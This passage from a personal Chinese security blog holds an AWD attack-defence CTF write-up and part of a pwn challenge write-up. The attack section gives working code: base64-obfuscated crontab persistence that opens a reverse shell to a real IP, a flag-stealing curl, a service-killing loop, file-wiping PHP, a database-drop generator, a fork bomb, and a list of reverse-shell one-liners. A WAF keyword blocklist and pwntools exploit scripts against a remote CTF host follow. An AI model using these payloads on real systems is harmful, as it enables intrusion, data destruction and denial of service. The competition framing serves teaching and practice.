class="string">'/var/www/html/'</span>)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'/bin/rm -rf %s'</span> % rm_paths</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_rm.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_flag_submit</span><span class="params">(flag_server, flag_port, flag_api, flag_token,</span></span></span><br><span class="line"><span class="function"><span class="params">                        flag_host)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">'/tmp'</span></span><br><span class="line">    cmd = <span class="string">'/usr/bin/curl "http://%s:%s/%s" -d "token=%s&amp;flag=$(curl %s)" '</span> % (</span><br><span class="line">        flag_server, flag_port, flag_api, flag_token, flag_host)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_submit.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  cmd = crontab_flag_submit(flag_server='0.0.0.0',</span></span><br><span class="line">                          <span class="comment">#  flag_port='8888',</span></span><br><span class="line">                          <span class="comment">#  flag_api='submit',</span></span><br><span class="line">                          <span class="comment">#  flag_token='bcbe3365e6ac95ea2c0343a2395834dd',</span></span><br><span class="line">                          <span class="comment">#  flag_host='http://192.168.100.1/Getkey')</span></span><br><span class="line"><span class="comment">#  print(cmd)</span></span><br><span class="line"></span><br><span class="line">cmd = crontab_reverse(<span class="string">'202.204.62.222'</span>,<span class="number">6666</span>)</span><br><span class="line">print(cmd)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个应该算是最牛逼的马了,waf基本挡不住,杀也杀不死.  </p>
<ul>
<li>疯狂日apache2和nigix:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="keyword">while</span> [[ 1 ]]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;杀不死基本凉凉,服务down扣分贼严重,</p>
<ul>
<li>删东西:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(glob($path) <span class="keyword">as</span> $afile)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir($afile))</span><br><span class="line">                getfiles($afile.<span class="string">'/*.php'</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @file_put_contents($afile,<span class="string">"#Anything#"</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        getfiles(<span class="keyword">__DIR__</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    array_map(<span class="string">'unlink'</span>, glob(<span class="string">"some/dir/*.php"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;不说了,心里痛…qaq  </p>
<ul>
<li>删库跑路:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm_db</span><span class="params">(db_user,my_db_passwd)</span>:</span></span><br><span class="line">    cmd = <span class="string">"/usr/bin/mysql -h localhost -u%s %s -e '"</span>%(db_user,my_db_passwd)</span><br><span class="line">    db_name = [<span class="string">'performance_schema'</span>,<span class="string">'mysql'</span>,<span class="string">'flag'</span>]</span><br><span class="line">    <span class="keyword">for</span> db <span class="keyword">in</span> db_name:</span><br><span class="line">        cmd += <span class="string">"drop database %s;"</span>%db</span><br><span class="line">    cmd += <span class="string">"'"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个应该也是杀伤力极强,基本不会有人备份库子…</p>
<ul>
<li>fork_bomb  </li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/<span class="built_in">echo</span> <span class="string">'.() &#123; .|.&amp; &#125; &amp;&amp; .'</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这东西不及时发现就凉了,磁盘一会就爆了</p>
<ul>
<li>反弹后门技巧</li>
</ul>
<blockquote>
<p>shell</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.3.3.7 4444</span><br><span class="line">bash -c <span class="string">'bash -i &gt;/dev/tcp/1.3.3.7/4444 0&gt;&amp;1'</span></span><br><span class="line">zsh -c <span class="string">'zmodload zsh/net/tcp &amp;&amp; ztcp 1.3.3.7 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY'</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444</span><br></pre></td></tr></table></figure>
<blockquote>
<p>python</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>windows</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e /bin/bash <span class="number">1.3</span>.<span class="number">3.7</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;看到这么多罪恶的脚本心里好受了许多</p>
<blockquote>
<p>一定要记得流量混淆,瞎鸡儿发一下垃圾包假装连一句话混淆视听</p>
</blockquote>
<h3 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h3><hr>
<p>&emsp;&emsp;防御是真的难,但也基本就一下几点:</p>
<ol>
<li><p>日志</p>
<ul>
<li>/var/log/apache2/access.log</li>
<li>/var/log/apache2/error.log</li>
<li>/var/log/nginx/access.log</li>
<li>/var/log/nginx/error.log</li>
</ul>
</li>
<li><p>要快速弄清楚服务的目录,做好备份!!!!!!!</p>
<ul>
<li>去看/etc/apache2/ports.conf和/etc/apache2/sites-available/000-default.conf,快速找到目录和对应端口</li>
<li>去/etc/nginx/ 基本差不多</li>
<li>不做备份哭鸡鸡</li>
</ul>
</li>
<li><p>配置目录权限,尽量不要给777</p>
</li>
<li><p>挂waf,但是框架挂waf有些困难,我得再研究一下挂在哪里比较合适,盲猜得挂路由…</p>
<ul>
<li>这是我魔改的蜜罐,过滤了crontab和base64,我真是怕了…</li>
<li>需要注意的是,最好建一个log目录然后给777,最好不要直接把log写在当前目录下</li>
</ul>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">'LOG_FILENAME'</span>, <span class="string">'log.txt'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>) $headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>))))) ] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $headers;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $get = $_GET;</span><br><span class="line">    $post = $_POST;</span><br><span class="line">    $cookie = $_COOKIE;</span><br><span class="line">    $header = getallheaders();</span><br><span class="line">    $files = $_FILES;</span><br><span class="line">    $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span><br><span class="line">    $filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>];</span><br><span class="line">    <span class="comment">//rewirte shell which uploaded by others, you can do more</span></span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"virink"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]); <span class="comment">//fix a bug</span></span><br><span class="line">    $input = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"Get"</span> =&gt; $get,</span><br><span class="line">        <span class="string">"Post"</span> =&gt; $post,</span><br><span class="line">        <span class="string">"Cookie"</span> =&gt; $cookie,</span><br><span class="line">        <span class="string">"File"</span> =&gt; $files,</span><br><span class="line">        <span class="string">"Header"</span> =&gt; $header</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//deal with</span></span><br><span class="line">    $pattern = <span class="string">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">    $pattern.= <span class="string">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span>;</span><br><span class="line">    $vpattern = explode(<span class="string">"|"</span>, $pattern);</span><br><span class="line">    $bool = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($vpattern <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($v <span class="keyword">as</span> $kk =&gt; $vv) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">"/$value/i"</span>, $vv)) &#123;</span><br><span class="line">                    $bool = <span class="keyword">true</span>;</span><br><span class="line">                    logging($input);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($bool) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($bool) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">    file_put_contents(LOG_FILENAME, <span class="string">"\r\n"</span> . time() . <span class="string">"\r\n"</span> . print_r($var, <span class="keyword">true</span>) , FILE_APPEND);</span><br><span class="line">    <span class="comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span></span><br><span class="line">&#125;</span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li><p>写shell监视文件变化</p>
</li>
<li><p>不死马删除</p>
<ul>
<li>杀死www-data的进程,然后新建一个同名的文件</li>
<li>crontab马…只能写shell了,或者用php脚本删除crontab</li>
</ul>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line">ps -aux|grep <span class="string">'www-data'</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><hr>
<p>&emsp;&emsp;其实awd不在于漏洞多,在于cve的利用和搅屎,有一段时间我们没有掉分结果排名十分靠前,说明能进攻的队基本没几个,所以在准备不周的情况下做好防御就行了.<br>&emsp;&emsp;然后就是赛后一定要多尝试,要去熟悉主流框架的cve比如thinkphp laravel之类的.真正比赛的时候根本来不及仔细看哪些是后门,也没时间代码审计,全靠手感和经验.</p>
<h4 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h4><hr>
<p>&emsp;&emsp;这是我写的awd攻击框架(虽然没用上…),能批量shell执行,很舒服.欢迎体验<a href="https://github.com/Explainaur/P4rr0t_shell" target="_blank" rel="noopener">parrot_shell</a></p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat2.jpg?raw=true" alt="parrot"></p>
<p>&emsp;&emsp;最后来一张队友合照,嘿嘿404 forever</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat3.jpg?raw=true" alt="404"></p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-06-03</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/06/03/adworld-pwn部分writeUp/">adworld_pwn部分writeUp</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><hr>
<p>&emsp;&emsp;首先checksec一下发现有canary，然后托到ida里看一下，发现大部分变量都是 <strong>unsigned int</strong> 类型，考虑到可能会有整数溢出。接着我们发现可以通过 <strong>change number</strong> 选项来直接修改栈上的数据，因此我们想到直接修改返回地址，如图：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_1.jpg?raw=true" alt="stack2_1"></p>
<p>&emsp;&emsp;接着我们发现 <strong>hackhere</strong> 函数，里面是直接调用的  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/bin/bash"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_2.jpg?raw=true" alt="stack2_2"><br>&emsp;&emsp;因此，我们可以直接将返回地址修改为这里，我们注意到数组的类型是 <strong>char</strong> ，因此在发送payload的时候可以直接按照小端序字符逐位发送。</p>
<p>&emsp;&emsp;但是这里有一个坑点，我们通过静态分析发现数组距离 <strong>return_addr</strong> 的位置为0x74：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_3.jpg?raw=true" alt="stack2_3">  </p>
<p>&emsp;&emsp;但是我们在实际动态调试的时候发现其实际偏移为0x84，这里是因为，在进入main函数时进行了一步esp的对齐：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#开头</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           0x080485d0      8d4c2404       lea ecx, dword [arg_4h]     ; 4</span><br><span class="line">|           0x080485d4      83e4f0             and esp, 0xfffffff0</span><br><span class="line">|           0x080485d7      ff71fc               push dword [ecx - 4]</span><br><span class="line">|           0x080485da      55                      push ebp</span><br><span class="line">|           0x080485db      89e5                 mov ebp, esp</span><br><span class="line">|           0x080485dd      51                      push ecx</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">#结尾</span><br><span class="line">|           0x080488eb      8b4dfc         mov ecx, dword [local_4h]</span><br><span class="line">|           0x080488ee      c9             leave</span><br><span class="line">|           0x080488ef      8d61fc         lea esp, dword [ecx - 4]</span><br><span class="line">\           0x080488f2      c3             ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其实这里没有必要深入计算，因为动态调试可以算出偏移为0x84,但是作为一个知识点，我们还是要讨论一下这个main函数的返回方式，我们遇到过很多main函数通过ecx进行返回，并且有esp对其的过程。  </p>
<p>&emsp;&emsp;这一次，首先将 <strong>$esp + 4</strong> 放入ecx，然后 <code>and esp,0xfffffff0</code> 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 <strong>$ecx - 4</strong> 压入栈中。注意，这里的 <strong>$ecx - 4</strong> 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 <code>lea ecx, dword [arg_4h]</code> 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">						high                                |		arg_4		 |</span><br><span class="line">											 |	return_addr        |             return_addr <span class="number">1</span>                                  </span><br><span class="line">											 |	 .....................	  |</span><br><span class="line"></span><br><span class="line">after align	               							     some span</span><br><span class="line"></span><br><span class="line">											 |		ecx - <span class="number">4</span>		  |				return_addr  <span class="number">2</span></span><br><span class="line">											 |		    ebp              |</span><br><span class="line">											 |                  ecx               |</span><br><span class="line">			 			low                                  |      ....................         |</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;返回的时候就恢复ecx的值然后直接利用 <strong>[ecx - 4]</strong> 回到return_addr1的位置。</p>
<p>因此，payload如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">system_addr = <span class="number">0x804859B</span></span><br><span class="line"><span class="comment">#sh = process("./stack2")</span></span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">53413</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(index, value)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(value))</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">fuck(<span class="number">0x84</span>,<span class="number">0x9b</span>)</span><br><span class="line">fuck(<span class="number">0x85</span>,<span class="number">0x85</span>)</span><br><span class="line">fuck(<span class="number">0x86</span>,<span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x87</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;但是打过去之后发现系统提示:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/usr/bin/bash"</span> not found</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;所以我们只好直接调用 <strong>system</strong>函数，并将sh传参给它，因此payload如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./stack2")</span></span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">53413</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x0804859b</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(index, value)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(value))</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">fuck(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">fuck(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">fuck(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#中间流出了4个字节，用于存放 fake_return_address</span></span><br><span class="line">fuck(<span class="number">0x8c</span>, <span class="number">0x87</span>)           <span class="comment">#这里我们发现地址是奇数位，是因为我们直接把bash拆开成了sh</span></span><br><span class="line">fuck(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">fuck(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="pwn1-babystack"><a href="#pwn1-babystack" class="headerlink" title="pwn1 babystack"></a>pwn1 babystack</h3><p>&emsp;&emsp;checksec后我们发现程序开启了canary，大概要进行canary的泄漏。  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_1.png?raw=true" alt="checksec">  </p>
<p>&emsp;&emsp;在对main函数进行静态分析后我们发现了一个明显的溢出点，<strong> read()</strong> 函数存在经典溢出，而且在  <strong>case 2</strong> 处我们可以通过 <strong>puts()</strong> 函数泄露canary的值。  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_2.png?raw=ture" alt="overflow"></p>
<p>&emsp;&emsp;对于canary的泄漏方式，最简单的一种是覆盖其最低为的 <em>\x00</em> 字节，防止截断，然后通过puts将其泄漏出来。  </p>
<p>&emsp;&emsp;仔细审计程序之后，我们基本清楚了攻击流程，首先这是一个经典的菜单类程序，通过case 1我们可以覆盖栈上的数据，因此，第一步我们先填充padding来覆盖canary的低位字节经计算offset为136个字节。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_3.png?raw=true" alt="canary"></p>
